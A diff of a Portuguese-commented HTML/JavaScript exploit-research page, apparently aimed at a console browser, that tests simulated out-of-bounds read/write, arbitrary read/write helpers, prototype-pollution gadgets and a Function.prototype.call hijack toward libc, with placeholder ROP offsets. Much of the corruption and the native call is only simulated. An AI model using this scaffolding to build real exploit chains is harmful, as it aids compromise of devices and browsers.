@@ -2,13 +2,17 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Script Focado (Baseado em Logs)</title>
+    <title>Script Focado V 2</title>
     <style>
         /* Estilos CSS (Sumário Removido) */
         body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
-        #output { background: #222; border: 1px solid #444; padding: 10px; height: 70vh; /* Aumentar altura */ overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
-        /* Regras de log inalteradas */
-        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; } .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; } hr { border: 1px solid #555; margin: 20px 0; }
+        #output { background: #222; border: 1px solid #444; padding: 10px; height: 75vh; /* Altura aumentada */ overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
+        /* #summary removido */
+        /* #summary h2 removido */
+        /* #summary ul removido */
+        /* #summary li removido */
+        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; } .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
+        /* hr removido (não necessário sem sumário) */
         button { padding: 10px 15px; font-size: 14px; cursor: pointer; background-color: #555; color: #eee; border: 1px solid #777; }
         button:hover { background-color: #777; }
         button:disabled { background-color: #333; color: #777; cursor: not-allowed; }
@@ -19,9 +23,7 @@
     <p>Foco: OOB R/W, PP Gadgets, Interações. Testando Opção A (PP Gadget) e Opção B (R/W Arb Simulado -> Notificação).</p>
     <button id="runBtn" onclick="runFocusedTests()">Iniciar Testes Focados</button>
     <div id="output"></div>
-    {/* Sumário Removido */}
-    {/* <hr> */}
-    {/* <div id="summary"></div> */}
+    {/* Sumário e hr Removidos */}
 
     <script>
         // <<< INÍCIO: IIFE Wrapper >>>
@@ -30,7 +32,7 @@
             const runBtn = document.getElementById('runBtn');
             const SHORT_PAUSE = 50;
             const MEDIUM_PAUSE = 500;
-            // findings removido (sem sumário)
+            // findings removido
             let ppGadgetsBroken = {};
             let leakedValueFromOOB = null; // Será {high, low, type, offset}
             let corruptedMetadataBuffer = null;
@@ -40,11 +42,11 @@
             // --- Endereços Base e Offsets ---
             const libcBaseAddress = 0x180AC8000n; // BigInt
             const libkernelBaseAddress = 0x80FCA0000n; // BigInt
-            // Placeholders (Manter como números por enquanto, verificar sintaxe)
+            // Placeholders (Manter como números, verificar sintaxe)
             const putsOffset = 0xABCDEF;
-            const freeHookOffset = 0xDEADBEEF;
-            const gotEntryOffset = 0xCAFEBABE;
-            const kernelTargetOffset = 0xFEEDFACE;
+            const freeHookOffset = 0xDEADBEEF; // Sem _ no final
+            const gotEntryOffset = 0xCAFEBABE; // Sem _ no final
+            const kernelTargetOffset = 0xFEEDFACE; // Sem _ no final
 
             // Offset da Notificação (BigInt)
             const notificationFuncOffset = 0x0001afe0n;
@@ -54,8 +56,8 @@
             const ROP_POP_RSI_RET_OFFSET = 0x222222;
             const ROP_POP_RDX_RET_OFFSET = 0x333333;
 
-            // Tipos de Log Importantes (agora só para console/output, não sumário)
-            const IMPORTANT_LOG_TYPES = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good', 'warn', 'info']; // Expandido para mostrar mais info
+            // Tipos de Log Importantes (mantido para formatação do log no outputDiv)
+            const IMPORTANT_LOG_TYPES = ['test', 'vuln', 'critical', 'error', 'escalation', 'leak', 'ptr', 'good', 'warn', 'info'];
 
             // Função log (Modificada para remover 'findings')
             const log = (message, type = 'info', funcName = '') => {
@@ -79,6 +81,7 @@
             const isPotentialPointer64 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; const high_u = high >>> 0; const low_u = low >>> 0; if (high_u === 0xFFFFFFFF && low_u === 0xFFFFFFFF) return false; if (high_u === 0xAAAAAAAA && low_u === 0xAAAAAAAA) return false; if (high_u === 0xAAAAAAEE && low_u === 0xAAAAAAAA) return false; if (high_u === 0xAAAAAAAA && low_u === 0xAAAAAAEE) return false; if (high_u === 0xBBBBBBEE && low_u === 0xBBBBBBBB) return false; if (high_u === 0xBBBBBBBB && low_u === 0xBBBBBBEE) return false; if (high === 0 && low < 0x100000) return false; return true; };
             const isPotentialData32 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE || val === 0xBBBBBBBB || val === 0xBBBBBBEE) return false; if (val < 0x1000) return false; return true; };
 
+
             // --- Testes Focados ---
 
             // Teste 1: OOB Write Simples + OOB Read Leak (Inalterado do original)
@@ -101,14 +104,14 @@
                        log(`VULN: (SIMULADO) Metadados (byteLength) corrompidos para ${toHex(fakeCorruptedLength)}!`, 'critical', FNAME);
                        log(`---> *** ALERTA: Primitivo Poderoso Obtido (Corrupção de Metadados) ***`, 'escalation', FNAME);
                        corruptedMetadataBuffer = victimBuffer;
-                       corruptedMetadataBufferBaseAddr = 0x220000000n + BigInt(Math.floor(Math.random() * 0x1000) * 0x1000); // Novo endereço simulado
+                       corruptedMetadataBufferBaseAddr = 0x230000000n + BigInt(Math.floor(Math.random() * 0x1000) * 0x1000); // Novo endereço simulado
                        log(`LEAK: (SIMULADO) Endereço base do buffer corrompido vazado: ${toHex(corruptedMetadataBufferBaseAddr, 64)}`, 'leak', FNAME);
                        log(`---> *** ALERTA: Vazamento de Endereço Base (Necessário p/ R/W Absoluto) ***`, 'escalation', FNAME);
                        const rwView = new DataView(corruptedMetadataBuffer);
                        const read64 = (absoluteAddr) => {
                            if (typeof absoluteAddr !== 'bigint') absoluteAddr = BigInt(absoluteAddr);
                            const relativeOffset = Number(absoluteAddr - corruptedMetadataBufferBaseAddr);
-                           if (relativeOffset < 0 || relativeOffset + 8 > fakeCorruptedLength) { throw new Error(`Read OOB: ${toHex(absoluteAddr)}`); }
+                           if (relativeOffset < 0 || relativeOffset + 8 > fakeCorruptedLength) { throw new Error(`Read OOB: ${toHex(absoluteAddr, 64)}`); }
                            const low = BigInt(rwView.getUint32(relativeOffset, true));
                            const high = BigInt(rwView.getUint32(relativeOffset + 4, true));
                            return (high << 32n) | low;
@@ -117,7 +120,7 @@
                            if (typeof absoluteAddr !== 'bigint') absoluteAddr = BigInt(absoluteAddr);
                            if (typeof value !== 'bigint') value = BigInt(value);
                            const relativeOffset = Number(absoluteAddr - corruptedMetadataBufferBaseAddr);
-                           if (relativeOffset < 0 || relativeOffset + 8 > fakeCorruptedLength) { throw new Error(`Write OOB: ${toHex(absoluteAddr)}`); }
+                           if (relativeOffset < 0 || relativeOffset + 8 > fakeCorruptedLength) { throw new Error(`Write OOB: ${toHex(absoluteAddr, 64)}`); }
                            rwView.setUint32(relativeOffset, Number(value & 0xFFFFFFFFn), true);
                            rwView.setUint32(relativeOffset + 4, Number((value >> 32n) & 0xFFFFFFFFn), true);
                        };
@@ -136,27 +139,27 @@
                 const FNAME = 'testArbitraryRW';
                 log("--- Iniciando Teste: Tentativa de R/W Arbitrário ---", 'test', FNAME);
                  if (!arbitraryRWHelpers) { log("Helpers R/W Arbitrário não disponíveis. Pulando.", 'warn', FNAME); log("--- Teste Concluído (Pulado) ---", 'test', FNAME); return; }
-                 log(`Helpers R/W Arbitrário disponíveis! Base do Buffer: ${toHex(corruptedMetadataBufferBaseAddr)}`, 'info', FNAME);
+                 log(`Helpers R/W Arbitrário disponíveis! Base do Buffer: ${toHex(corruptedMetadataBufferBaseAddr, 64)}`, 'info', FNAME);
                  const { read64, write64 } = arbitraryRWHelpers;
                  const targetLibcAddr = BigInt(libcBaseAddress) + BigInt(putsOffset);
                  const targetKernelAddr = BigInt(libkernelBaseAddress) + BigInt(kernelTargetOffset);
                  log(`Alvo 1 (Ex: puts na libc): ${toHex(targetLibcAddr, 64)}`, 'info', FNAME);
                  log(`Alvo 2 (Ex: alvo no kernel): ${toHex(targetKernelAddr, 64)}`, 'info', FNAME);
                  try {
-                     log(`Tentando ler 64 bits de ${toHex(targetLibcAddr)}...`, 'info', FNAME);
+                     log(`Tentando ler 64 bits de ${toHex(targetLibcAddr, 64)}...`, 'info', FNAME);
                      const libcValue = read64(targetLibcAddr);
-                     log(`LEAK: Leitura Arbitrária (Abs. Simulado) de ${toHex(targetLibcAddr)}: ${toHex(libcValue, 64)}`, 'leak', FNAME); // Especificar 64 bits
+                     log(`LEAK: Leitura Arbitrária (Abs. Simulado) de ${toHex(targetLibcAddr, 64)}: ${toHex(libcValue, 64)}`, 'leak', FNAME);
                      log(`---> *** ALERTA: Primitiva Arbitrary Read (Absoluta Simulada) FUNCIONANDO! ***`, 'escalation', FNAME);
-                 } catch (eReadLibc) { log(`FALHA Leitura Arbitrária (Abs. Simulado) de ${toHex(targetLibcAddr)}: ${eReadLibc.message}`, 'error', FNAME); }
+                 } catch (eReadLibc) { log(`FALHA Leitura Arbitrária (Abs. Simulado) de ${toHex(targetLibcAddr, 64)}: ${eReadLibc.message}`, 'error', FNAME); }
                  await PAUSE(SHORT_PAUSE);
                  try {
                     const safeWriteAddr = corruptedMetadataBufferBaseAddr + 2000n;
                     const valueToWrite = 0xDEADBEEFCAFEBABEn; // Sem underscore
-                    log(`Tentando escrever ${toHex(valueToWrite, 64)} em ${toHex(safeWriteAddr)}...`, 'info', FNAME);
+                    log(`Tentando escrever ${toHex(valueToWrite, 64)} em ${toHex(safeWriteAddr, 64)}...`, 'info', FNAME);
                     write64(safeWriteAddr, valueToWrite);
-                    log(`VULN: Escrita Arbitrária (Abs. Simulado) em ${toHex(safeWriteAddr)} realizada.`, 'vuln', FNAME);
+                    log(`VULN: Escrita Arbitrária (Abs. Simulado) em ${toHex(safeWriteAddr, 64)} realizada.`, 'vuln', FNAME);
                     await PAUSE(SHORT_PAUSE);
-                    log(`Tentando ler de volta de ${toHex(safeWriteAddr)}...`, 'info', FNAME);
+                    log(`Tentando ler de volta de ${toHex(safeWriteAddr, 64)}...`, 'info', FNAME);
                     const readBackValue = read64(safeWriteAddr);
                     if (readBackValue === valueToWrite) {
                         log(`GOOD: Confirmação R/W Arbitrário (Abs. Simulado): Leu ${toHex(readBackValue, 64)} de volta!`, 'good', FNAME);
@@ -171,32 +174,31 @@
 
             // Teste 4: PP Avançada / Gadgets (MODIFICADO gadgetCheck Function.call)
             const testAdvancedPP = async () => {
-                const FNAME = 'testAdvancedPP'; log("--- Iniciando Teste: PP Avançado (Gadgets++) ---", 'test', FNAME); ppGadgetsBroken = {}; const propsToPollute = [ /* Copiado do seu original, mas com gadgetCheck modificado */ { name: 'constructor', proto: Object.prototype, protoName: 'Object' }, { name: '__proto__', proto: Object.prototype, protoName: 'Object' }, { name: 'isAdmin', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => obj.isAdmin === v ? 'Pot bypass isAdmin!' : null }, { name: 'nodeType', proto: Object.prototype, protoName: 'Object' }, { name: 'valueOf', proto: Object.prototype, protoName: 'Object' }, { name: 'toString', proto: Object.prototype, protoName: 'Object' }, { name: 'hasOwnProperty', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v, item) => { try{({}).hasOwnProperty('a'); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Object.hasOwnProperty quebrou! ${e.message}`;} } }, { name: 'innerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'outerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'textContent', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div') }, { name: 'href', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.href === v ? 'PP afetou attr DOM `href`!' : null, createTarget: () => document.createElement('a')}, { name: 'src', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.src === v ? 'PP afetou attr DOM `src`!' : null, createTarget: () => document.createElement('img') }, { name: 'style', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.style === v ? 'PP afetou prop `style`!' : null, createTarget: () => document.createElement('div') }, { name: 'onclick', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onclick === v ? 'PP afetou handler `onclick`!' : null, createTarget: () => document.createElement('button') }, { name: 'onerror', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onerror === v ? 'PP afetou handler `onerror`!' : null, createTarget: () => document.createElement('img') }, { name: 'onload', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onload === v ? 'PP afetou handler `onload`!' : null, createTarget: () => document.createElement('img') }, { name: 'appendChild', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v, item) => { try { obj.appendChild(document.createElement('span')); return null; } catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Node.appendChild quebrou! ${e.message}`;} } }, { name: 'addEventListener', proto: EventTarget.prototype, protoName: 'EventTarget', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v, item) => { try { obj.addEventListener('test', ()=>{}); return null; } catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `EventTarget.addEventListener quebrou! ${e.message}`;} } }, { name: 'value', proto: HTMLInputElement.prototype, protoName: 'HTMLInputElement', createTarget: () => document.createElement('input'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou input.value!' : null }, { name: 'value', proto: HTMLTextAreaElement.prototype, protoName: 'HTMLTextAreaElement', createTarget: () => document.createElement('textarea'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou textarea.value!' : null }, { name: 'map', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v, item) => { try{[].map(()=>{}); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Array.map quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'filter', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v, item) => { try{[].filter(()=>{}); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Array.filter quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'forEach', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v, item) => { try{[].forEach(()=>{}); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Array.forEach quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'join', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v, item) => { try{[1,2].join(); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Array.join quebrou! ${e.message}`;} }, createTarget: () => [] },
-                     // <<< Opção A: gadgetCheck modificado (qualquer erro ativa) >>>
+                const FNAME = 'testAdvancedPP'; log("--- Iniciando Teste: PP Avançado (Gadgets++) ---", 'test', FNAME); ppGadgetsBroken = {}; const propsToPollute = [ { name: 'constructor', proto: Object.prototype, protoName: 'Object' }, { name: '__proto__', proto: Object.prototype, protoName: 'Object' }, { name: 'isAdmin', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v) => obj.isAdmin === v ? 'Pot bypass isAdmin!' : null }, { name: 'nodeType', proto: Object.prototype, protoName: 'Object' }, { name: 'valueOf', proto: Object.prototype, protoName: 'Object' }, { name: 'toString', proto: Object.prototype, protoName: 'Object' }, { name: 'hasOwnProperty', proto: Object.prototype, protoName: 'Object', gadgetCheck: (obj, v, item) => { try{({}).hasOwnProperty('a'); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Object.hasOwnProperty quebrou! ${e.message}`;} } }, { name: 'innerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'outerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div') }, { name: 'textContent', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div') }, { name: 'href', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.href === v ? 'PP afetou attr DOM `href`!' : null, createTarget: () => document.createElement('a')}, { name: 'src', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.src === v ? 'PP afetou attr DOM `src`!' : null, createTarget: () => document.createElement('img') }, { name: 'style', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.style === v ? 'PP afetou prop `style`!' : null, createTarget: () => document.createElement('div') }, { name: 'onclick', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onclick === v ? 'PP afetou handler `onclick`!' : null, createTarget: () => document.createElement('button') }, { name: 'onerror', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onerror === v ? 'PP afetou handler `onerror`!' : null, createTarget: () => document.createElement('img') }, { name: 'onload', proto: Element.prototype, protoName: 'Element', gadgetCheck: (obj, v) => obj.onload === v ? 'PP afetou handler `onload`!' : null, createTarget: () => document.createElement('img') }, { name: 'appendChild', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v, item) => { try { obj.appendChild(document.createElement('span')); return null; } catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Node.appendChild quebrou! ${e.message}`;} } }, { name: 'addEventListener', proto: EventTarget.prototype, protoName: 'EventTarget', createTarget: () => document.createElement('div'), gadgetCheck: (obj, v, item) => { try { obj.addEventListener('test', ()=>{}); return null; } catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `EventTarget.addEventListener quebrou! ${e.message}`;} } }, { name: 'value', proto: HTMLInputElement.prototype, protoName: 'HTMLInputElement', createTarget: () => document.createElement('input'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou input.value!' : null }, { name: 'value', proto: HTMLTextAreaElement.prototype, protoName: 'HTMLTextAreaElement', createTarget: () => document.createElement('textarea'), gadgetCheck: (obj,v) => obj.value === v ? 'PP afetou textarea.value!' : null }, { name: 'map', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v, item) => { try{[].map(()=>{}); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Array.map quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'filter', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v, item) => { try{[].filter(()=>{}); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Array.filter quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'forEach', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v, item) => { try{[].forEach(()=>{}); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Array.forEach quebrou! ${e.message}`;} }, createTarget: () => [] }, { name: 'join', proto: Array.prototype, protoName: 'Array', gadgetCheck: (obj, v, item) => { try{[1,2].join(); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Array.join quebrou! ${e.message}`;} }, createTarget: () => [] },
+                     // <<< MODIFICAÇÃO Opção A: gadgetCheck Function.call (qualquer erro ativa) >>>
                      { name: 'call', proto: Function.prototype, protoName: 'Function',
                         gadgetCheck: (fn, v, item) => { // fn é o dummyArg (function(){})
-                            try {
-                                // Tenta usar a função .call poluída de uma forma simples
-                                fn.call(null);
-                                return false; // Se não deu erro, não consideramos quebrado
-                            } catch (e) {
-                                // Se QUALQUER ERRO ocorrer, consideramos ATIVO
+                            try { fn.call(null); return false; }
+                            catch (e) {
                                 log(`-> INFO: Erro ao usar Function.call poluído detectado (${e.name}). Considerando gadget ATIVO.`, 'info', FNAME);
                                 ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; // <<< MARCA COMO QUEBRADO AQUI
-                                gadgetFound.push('Function.call: Quebrado! Potencial hijack (erro genérico).'); // Adicionado para log no sumário interno de gadgets
-                                return `Function.call quebrou! ${e.message}`; // Retorna a mensagem para log
+                                // gadgetFound não existe mais (sumário removido), apenas log
+                                log(`-> GADGET? Function.call: Quebrado! Potencial hijack (erro genérico).`, 'critical', FNAME);
+                                return `Function.call quebrou! ${e.message}`; // Retorna msg para log
                             }
                         }, createTarget: () => function(){} },
                      { name: 'apply', proto: Function.prototype, protoName: 'Function', gadgetCheck: (obj, v, item) => { try{function f(){}; f.apply(); return null;} catch(e){ ppGadgetsBroken[`${item.protoName}.${item.name}`] = true; return `Function.apply quebrou! ${e.message}`;} }, createTarget: () => function(){} }, ];
-                 const testValue = "PP_Adv_Polluted_" + Date.now(); let successCount = 0; let gadgetCount = 0; let gadgetMessages = []; for (const item of propsToPollute) { if (!item.proto) { continue; } const prop = item.name; const targetProto = item.proto; const targetProtoName = item.protoName; let inherited = false; let gadgetMsg = null; let errorMsg = null; let originalValue = undefined; let wasDefined = false; try { wasDefined = Object.prototype.hasOwnProperty.call(targetProto, prop); if (wasDefined) { originalValue = targetProto[prop]; } } catch (e) { log(`AVISO: Erro check/get original ${targetProtoName}.${prop}: ${e.message}`, 'warn', FNAME); continue; } try { targetProto[prop] = testValue; let obj; if (item.createTarget) { try { obj = item.createTarget(); } catch (e) { obj = {}; } } else { obj = {}; } let inheritedValue = undefined; try { inheritedValue = obj[prop]; } catch (e) {} if (inheritedValue === testValue) { log(`-> VULN: Herança PP para '${targetProtoName}.${prop}' OK.`, 'vuln', FNAME); inherited = true; successCount++; if (item.gadgetCheck) { try { gadgetMsg = item.gadgetCheck(obj, testValue, item); } catch(e){} if (gadgetMsg) { log(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME); gadgetMessages.push(prop + ": " + gadgetMsg); gadgetCount++; if (['innerHTML', 'outerHTML', 'src', 'href', 'onclick', 'onerror', 'onload', 'value', 'postMessage', 'send', 'call', 'apply', 'map', 'filter', 'forEach', 'appendChild', 'addEventListener', 'hasOwnProperty', 'join'].includes(prop)) { log(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para '${prop}'! ***`, 'escalation', FNAME); } } } } else { if (prop === '__proto__') { log(`-> FAIL: Herança de '__proto__' não OK (Esperado).`, 'good', FNAME); } } } catch (e) { log(`Erro ao poluir/testar '${targetProtoName}.${prop}': ${e.message}`, 'error', FNAME); errorMsg = e.message; } finally { try { let cleanupOK = true; if (wasDefined) { targetProto[prop] = originalValue; try { if (targetProto[prop] !== originalValue) cleanupOK = false; } catch(e){ cleanupOK = false; } } else { delete targetProto[prop]; if (Object.prototype.hasOwnProperty.call(targetProto, prop)) cleanupOK = false; } if (!cleanupOK) { log(`---> CRITICAL: FALHA ao limpar/restaurar ${targetProtoName}.${prop}! Estado pode estar inconsistente. <---`, 'critical', FNAME); } } catch (e) { log(`AVISO CRÍTICO: Erro INESPERADO ao limpar/restaurar ${targetProtoName}.${prop}: ${e.message}`, 'critical', FNAME); } } await PAUSE(15); } log(`--- Teste Concluído (${successCount} OK, ${gadgetCount} gadgets encontrados) ---`, 'test', FNAME); if (gadgetCount > 0) { log(`Gadgets detectados: ${gadgetMessages.join('; ')}`, 'critical', FNAME); } await PAUSE();
+                 const testValue = "PP_Adv_Polluted_" + Date.now(); let successCount = 0; let gadgetCount = 0; let gadgetMessages = []; // Mantido para logs, não sumário
+                 for (const item of propsToPollute) { if (!item.proto) { continue; } const prop = item.name; const targetProto = item.proto; const targetProtoName = item.protoName; let inherited = false; let gadgetMsg = null; let errorMsg = null; let originalValue = undefined; let wasDefined = false; try { wasDefined = Object.prototype.hasOwnProperty.call(targetProto, prop); if (wasDefined) { originalValue = targetProto[prop]; } } catch (e) { log(`AVISO: Erro check/get original ${targetProtoName}.${prop}: ${e.message}`, 'warn', FNAME); continue; } try { targetProto[prop] = testValue; let obj; if (item.createTarget) { try { obj = item.createTarget(); } catch (e) { obj = {}; } } else { obj = {}; } let inheritedValue = undefined; try { inheritedValue = obj[prop]; } catch (e) {} if (inheritedValue === testValue) { log(`-> VULN: Herança PP para '${targetProtoName}.${prop}' OK.`, 'vuln', FNAME); inherited = true; successCount++; if (item.gadgetCheck) { try { gadgetMsg = item.gadgetCheck(obj, testValue, item); } catch(e){} if (gadgetMsg && !gadgetMsg.startsWith('Function.call')) { // Não loga gadget Function.call duas vezes
+                                // Correção: Referência a gadgetFound removida, usar gadgetMsg diretamente
+                                log(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME);
+                                gadgetMessages.push(prop + ": " + gadgetMsg); gadgetCount++; if (['innerHTML', 'outerHTML', 'src', 'href', 'onclick', 'onerror', 'onload', 'value', 'postMessage', 'send', 'call', 'apply', 'map', 'filter', 'forEach', 'appendChild', 'addEventListener', 'hasOwnProperty', 'join'].includes(prop)) { log(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para '${prop}'! ***`, 'escalation', FNAME); } } } } else { if (prop === '__proto__') { log(`-> FAIL: Herança de '__proto__' não OK (Esperado).`, 'good', FNAME); } } } catch (e) { log(`Erro ao poluir/testar '${targetProtoName}.${prop}': ${e.message}`, 'error', FNAME); errorMsg = e.message; } finally { try { let cleanupOK = true; if (wasDefined) { targetProto[prop] = originalValue; try { if (targetProto[prop] !== originalValue) cleanupOK = false; } catch(e){ cleanupOK = false; } } else { delete targetProto[prop]; if (Object.prototype.hasOwnProperty.call(targetProto, prop)) cleanupOK = false; } if (!cleanupOK) { log(`---> CRITICAL: FALHA ao limpar/restaurar ${targetProtoName}.${prop}! Estado pode estar inconsistente. <---`, 'critical', FNAME); } } catch (e) { log(`AVISO CRÍTICO: Erro INESPERADO ao limpar/restaurar ${targetProtoName}.${prop}: ${e.message}`, 'critical', FNAME); } } await PAUSE(15); } log(`--- Teste Concluído (${successCount} OK, ${gadgetCount} gadgets encontrados) ---`, 'test', FNAME); if (gadgetCount > 0) { log(`Gadgets detectados (exceto call): ${gadgetMessages.filter(m=>!m.startsWith('call:')).join('; ')}`, 'critical', FNAME); } await PAUSE();
             };
 
-            // Teste 5: Tentativa de Chamar Libc via Gadget PP (Inalterado do original - AGORA PODE FUNCIONAR)
+            // Teste 5: Tentativa de Chamar Libc via Gadget PP (Opção A - Pode não pular agora)
             const testPPGadgetCallLibc = async () => {
                  const FNAME = 'testPPGadgetCallLibc'; log("--- Iniciando Teste: Tentativa de chamar puts via Hijack (Function.call) ---", 'test', FNAME);
-                 // >>> Esta verificação agora pode passar se o gadgetCheck modificado funcionou <<<
                  if (!ppGadgetsBroken['Function.call']) { log("Gadget Function.call não quebrado/detectado no teste anterior. Pulando.", 'good', FNAME); log("--- Teste Concluído (Pulado) ---", 'test', FNAME); return; }
-                 // Se chegou aqui, gadget está ativo!
                  log(`GOOD: Gadget Function.call detectado como ATIVO! Prosseguindo com a tentativa de chamada (simulada) para puts...`, 'good', FNAME);
                  const targetPutsAddress = BigInt(libcBaseAddress) + BigInt(putsOffset); log(`Endereço base libc: ${toHex(libcBaseAddress, 64)}`, 'info', FNAME); log(`Offset puts (PLACEHOLDER): ${toHex(putsOffset)}`, 'warn', FNAME); log(`Endereço puts calculado: ${toHex(targetPutsAddress, 64)}`, 'good', FNAME); const originalCall = Function.prototype.call; let hijackExecutedCount = 0; let attemptedNativeCall = false; try { const hijackedCallFunction = function(thisArg, ...args) { hijackExecutedCount++; if (hijackExecutedCount === 1 && hijackedCallFunction.calledExplicitly) { log(`===> Function.call SEQUESTRADO! Tentando chamar puts em ${toHex(targetPutsAddress, 64)} <===`, 'vuln', FNAME); attemptedNativeCall = true; try { log(`[SIMULAÇÃO] Chamaria a função no endereço ${toHex(targetPutsAddress, 64)} com argumentos apropriados.`, 'warn', FNAME); log(` ---> *** ALERTA: Tentativa (simulada) de chamada nativa via PP Gadget + Info Leak! ***`, 'escalation', FNAME); log(` // TODO: Implementar lógica real de hijack e chamada aqui.`, 'warn', FNAME); } catch(e) { log(` -> Erro ao tentar simular chamada nativa: ${e.message}`, 'error', FNAME); } return "Simulated Native Call Result"; } else { try { return originalCall.apply(this, [thisArg, ...args]); } catch(e) { if (hijackExecutedCount <= 5) log(` -> Erro ao chamar originalCall.apply (Chamada #${hijackExecutedCount}): ${e.message}`, 'warn', FNAME); return undefined; } } }; hijackedCallFunction.calledExplicitly = false; log("Poluindo Function.prototype.call com função controlada...", 'info', FNAME); Function.prototype.call = hijackedCallFunction; log("Chamando (()=>{}).call(null) para ativar hijack e simular chamada...", 'info', FNAME); try { const dummyFunc = () => {}; hijackedCallFunction.calledExplicitly = true; const result = dummyFunc.call(null); log(` -> Chamada explícita para call concluída. Retorno: ${result}`, 'good', FNAME); } catch (e) { log(` -> Erro ao chamar call sequestrado explicitamente: ${e.message}`, 'error', FNAME); } await PAUSE(MEDIUM_PAUSE); } catch (e) { log(`Erro fatal durante Teste: ${e.message}`, 'error', FNAME); console.error(e); } finally { if (Function.prototype.call !== originalCall) { Function.prototype.call = originalCall; log("Function.prototype.call restaurado.", 'good', 'Cleanup'); } } log(`--- Teste Concluído (Hijack Executado ${hijackExecutedCount} vezes, Tentativa Chamada Nativa: ${attemptedNativeCall}) ---`, 'test', FNAME);
             };
@@ -206,26 +208,27 @@
